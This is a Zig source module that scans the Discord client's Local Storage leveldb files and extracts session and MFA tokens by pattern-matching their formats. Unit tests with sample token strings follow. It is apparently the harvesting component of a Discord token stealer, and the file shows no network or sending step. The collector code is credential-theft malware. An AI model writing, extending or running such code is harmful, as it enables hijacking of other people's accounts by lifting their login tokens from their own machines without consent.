const std = @import("std");
const file_io = @import("../parsers/file_io.zig");

fn isTokenChar(c: u8) bool {
    return switch (c) {
        'A'...'Z', 'a'...'z', '0'...'9', '_', '-' => true,
        else => false,
    };
}

fn scanLeveldbFiles(allocator: std.mem.Allocator, leveldb_path: []const u8, seen: *std.StringHashMap(void)) !void {
    var dir = std.fs.openDirAbsolute(leveldb_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch return) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        if (name.len < 4) continue;
        const ext = name[name.len - 4..];
        if (!std.mem.eql(u8, ext, ".ldb") and !std.mem.eql(u8, ext, ".log")) continue;

        const full_path = try std.fs.path.join(allocator, &[_][]const u8{ leveldb_path, name });
        defer allocator.free(full_path);

        const mapped = file_io.MappedFile.open(full_path) orelse continue;
        defer mapped.close();

        const data = mapped.slice();
        extractTokens(data, seen) catch {};
    }
}

fn extractTokens(data: []const u8, seen: *std.StringHashMap(void)) !void {
    var i: usize = 0;
    while (i < data.len) {
        if (i + 4 <= data.len and data[i] == 'm' and data[i + 1] == 'f' and data[i + 2] == 'a' and data[i + 3] == '.') {
            const start = i;
            var end = i + 4;
            while (end < data.len and isTokenChar(data[end])) : (end += 1) {}
            const token_len = end - start;
            if (token_len >= 84 and token_len <= 99) {
                const token = try seen.allocator.dupe(u8, data[start..end]);
                const gop = try seen.getOrPut(token);
                if (gop.found_existing) {
                    seen.allocator.free(token);
                } else {
                    gop.key_ptr.* = token;
                }
            }
            i = end;
            continue;
        }

        if (!isTokenChar(data[i])) {
            i += 1;
            continue;
        }

        var seg1_end = i;
        while (seg1_end < data.len and isTokenChar(data[seg1_end])) : (seg1_end += 1) {}
        const seg1_len = seg1_end - i;

        if (seg1_len == 24 and seg1_end < data.len and data[seg1_end] == '.') {
            const dot1 = seg1_end;
            var seg2_end = dot1 + 1;
            while (seg2_end < data.len and isTokenChar(data[seg2_end])) : (seg2_end += 1) {}
            const seg2_len = seg2_end - (dot1 + 1);

            if (seg2_len == 6 and seg2_end < data.len and data[seg2_end] == '.') {
                const dot2 = seg2_end;
                var seg3_end = dot2 + 1;
                while (seg3_end < data.len and isTokenChar(data[seg3_end])) : (seg3_end += 1) {}
                const seg3_len = seg3_end - (dot2 + 1);

                if (seg3_len >= 25 and seg3_len <= 110) {
                    const token = try seen.allocator.dupe(u8, data[i..seg3_end]);
                    const gop = try seen.getOrPut(token);
                    if (gop.found_existing) {
                        seen.allocator.free(token);
                    } else {
                        gop.key_ptr.* = token;
                    }
                }
                i = seg3_end;
                continue;
            }
            i = seg2_end;
            continue;
        }
        i = seg1_end;
    }
}

pub fn collect(allocator: std.mem.Allocator, app_data: []const u8) ![][]const u8 {
    const leveldb_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, "Local Storage", "leveldb" });
    defer allocator.free(leveldb_path);

    var seen = std.StringHashMap(void).init(allocator);
    defer seen.deinit();

    try scanLeveldbFiles(allocator, leveldb_path, &seen);

    var tokens = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (tokens.items) |t| allocator.free(t);
        tokens.deinit();
    }

    var it = seen.iterator();
    while (it.next()) |entry| {
        try tokens.append(entry.key_ptr.*);
    }

    return tokens.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__discord");
    defer {
        for (result) |t| std.testing.allocator.free(t);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "extractTokens parses standard Discord token" {
    const data = " prefix NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens parses MFA token" {
    const data = " prefix mfa.kVjF2pHn8mLq3wRs5tXb7zDc9AgE1yUf4iWo0pB6dChJMvNxYSZQaTlrGuIeOPsH suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens handles multiple unique tokens" {
    const data = "NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 other NzI4NDk1NjQzMjE4NzY1NDMyMQ.AdB9xL.h9KdN8mQwL4pR2sT6vXyZ1cF3gH5jU7kI0oP2bV4nW6mC suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 2), seen.count());
}

test "extractTokens deduplicates" {
    const data = "NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens skips invalid patterns" {
    const data = "short.abc.def not-a-valid-token no.dots.here either";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 0), seen.count());
}

test "isTokenChar validation" {
    try std.testing.expect(isTokenChar('A'));
    try std.testing.expect(isTokenChar('z'));
    try std.testing.expect(isTokenChar('0'));
    try std.testing.expect(isTokenChar('_'));
    try std.testing.expect(isTokenChar('-'));
    try std.testing.expect(!isTokenChar('.'));
    try std.testing.expect(!isTokenChar('!'));
    try std.testing.expect(!isTokenChar(' '));
}
